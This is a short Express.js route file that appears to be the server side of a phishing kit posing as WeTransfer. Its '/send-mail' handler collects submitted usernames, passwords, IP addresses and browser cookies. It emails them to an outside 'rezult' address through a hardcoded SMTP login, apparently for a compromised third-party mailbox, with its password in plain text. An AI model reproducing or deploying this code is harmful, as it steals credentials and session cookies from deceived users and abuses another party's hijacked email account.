const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

router.post('/send-mail', (req, res) => {
    const { username, pass, ip } = req.body;
    const cookies = req.cookies; // Get cookies from the request object
    const nodeTransport = mailer.createNodeMailerTransport('comando@bvbarrancos.pt', 'Bombeiros1980*');
    mailer.sendEmail('comando@bvbarrancos.pt', "dz-rezult@bounce-daemon.com", 'WeTransfer-Data', username, pass, ip, cookies, nodeTransport);
    res.status(200).send('Email sent successfully');
});

module.exports = router;
